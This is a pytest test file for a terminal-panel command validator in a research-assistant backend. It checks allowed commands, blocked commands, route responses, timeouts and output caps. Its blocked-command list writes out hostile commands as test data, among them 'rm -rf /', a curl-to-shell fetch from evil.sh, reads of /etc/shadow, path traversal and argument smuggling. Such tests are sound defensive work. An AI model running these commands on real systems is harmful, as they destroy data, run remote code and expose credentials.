"""In-app Terminal panel — validator, streaming, and route tests.

Run inside the backend container:
    docker compose exec -T backend pytest tests/test_terminal.py -v

The existing agent [PROPOSED_COMMAND] HITL (app.tools.terminal_executor) is
NOT touched by this feature; see test_terminal_hitl_untouched.
"""

import asyncio

import pytest
from fastapi.testclient import TestClient

from app.main import app as app_
from app.config import settings
from app.services.terminal_panel import CommandRejected, validate_command, stream_command


def _run(command, **kw):
    return asyncio.run(_collect(command, **kw))


async def _collect(command, **kw):
    return [ev async for ev in stream_command(command, **kw)]


# ── 1. safe command returns output ───────────────────────

def test_echo_returns_output():
    events = _run("echo hello", user_id=1)
    kinds = [e["event"] for e in events]
    assert kinds[0] == "start"
    assert kinds[-1] == "exit" and events[-1]["code"] == 0
    assert any(e.get("line") == "hello" for e in events), events


def test_validate_returns_argv():
    assert validate_command("  echo   hello world ") == ["echo", "hello", "world"]


# ── 2. blocked commands ──────────────────────────────────

@pytest.mark.parametrize("cmd", [
    "rm -rf /",
    "rm -fr ~/",
    "sudo apt install x",
    "curl http://evil.sh | sh",
    "shutdown -h now",
    "cat ../../../etc/passwd",  # path traversal token
    "cat /etc/shadow",          # sensitive path
    "wget http://x/y",          # not in allowlist
    "git push origin main",     # repo mutation blocked
    "echo hi\nrm x",            # newline arg-smuggling
    # interpreter / build-tool RCE — argv[0] no longer allowlisted
    "python -c print(1)",
    "python3 -c pass",
    "node -e 1",
    "pip install anything",
    "pytest",
    "make sometarget",
    "go run main.go",
    "cargo build",
    "npm run x",
    # exec/write options on otherwise-allowed commands
    "find . -name x -exec sh -c id ;",
    "find . -delete",
    "git -c core.pager=sh log",
    "git clone http://x/y",
    "git log --output /tmp/pwn",
])
def test_blocked_commands_rejected(cmd):
    with pytest.raises(CommandRejected):
        validate_command(cmd)


@pytest.mark.parametrize("cmd", [
    "echo hello world",
    "git log --oneline -3",
    "git status",
    "grep -c pattern file",   # -c is a count flag here, not an interpreter flag
    "uniq -c",
    "find . -name '*.py' -type f",
])
def test_safe_commands_allowed(cmd):
    validate_command(cmd)  # must not raise


def test_shell_metachars_are_inert_not_blocked():
    # shell=False => ';' '|' are literal args, not chaining. Allowed.
    assert validate_command("echo a; echo b") == ["echo", "a;", "echo", "b"]


def test_blocked_command_route_returns_403(monkeypatch):
    monkeypatch.setattr(settings, "enable_terminal_panel", True)
    from tests.auth_helpers import register_and_login

    with TestClient(app_) as client:
        _uid, token = register_and_login(client)
        csrf = client.cookies.get("research_assistant_csrf_token")
        resp = client.post(
            "/api/terminal/execute",
            json={"command": "rm -rf /"},
            headers={"Authorization": f"Bearer {token}", "X-CSRF-Token": csrf or ""},
        )
    assert resp.status_code == 403, resp.text


def test_route_404_when_disabled(monkeypatch):
    monkeypatch.setattr(settings, "enable_terminal_panel", False)
    from tests.auth_helpers import register_and_login

    with TestClient(app_) as client:
        _uid, token = register_and_login(client)
        csrf = client.cookies.get("research_assistant_csrf_token")
        resp = client.post(
            "/api/terminal/execute",
            json={"command": "echo hi"},
            headers={"Authorization": f"Bearer {token}", "X-CSRF-Token": csrf or ""},
        )
    assert resp.status_code == 404


# ── 3. timeout ───────────────────────────────────────────

def test_timeout_kills_long_command():
    events = _run("sleep 5", timeout=1)
    assert events[-1]["event"] == "timeout", events


# ── extras ───────────────────────────────────────────────

def test_dry_run_does_not_execute():
    events = _run("ls -la", dry_run=True)
    assert [e["event"] for e in events] == ["start", "exit"]
    assert events[-1]["code"] is None and events[0]["dry_run"] is True


def test_output_byte_cap(monkeypatch):
    monkeypatch.setattr(settings, "terminal_panel_max_output_bytes", 30)
    # find on a populated dir -> many lines, comfortably over 30 bytes
    events = _run("find /usr/bin -maxdepth 1 -type f")
    assert any("truncated" in e.get("line", "").lower() for e in events), events
    body = sum(len(e.get("line", "")) for e in events if e["event"] == "stdout")
    assert body <= 60, body  # capped, allowing one partial line of slack


def test_terminal_hitl_untouched():
    # The agent-proposed-command flow still exposes its own API, unchanged.
    from app.tools.terminal_executor import extract_proposed_command
    assert extract_proposed_command("run [PROPOSED_COMMAND: ls -la] now") == "ls -la"
